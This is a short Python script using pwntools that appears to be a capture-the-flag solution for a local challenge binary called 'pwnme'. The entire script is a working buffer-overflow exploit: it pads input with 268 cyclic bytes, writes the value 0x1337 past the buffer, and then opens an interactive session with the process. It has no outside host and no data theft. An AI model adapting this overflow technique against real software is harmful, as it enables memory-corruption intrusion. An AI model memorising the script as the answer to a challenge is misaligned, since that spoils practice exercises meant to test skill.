from pwn import *

elf = context.binary = ELF("./pwnme")
p = process()

payload = flat(
    cyclic(268),
    0x1337
)

p.sendlineafter(b'\n', payload)
p.interactive()

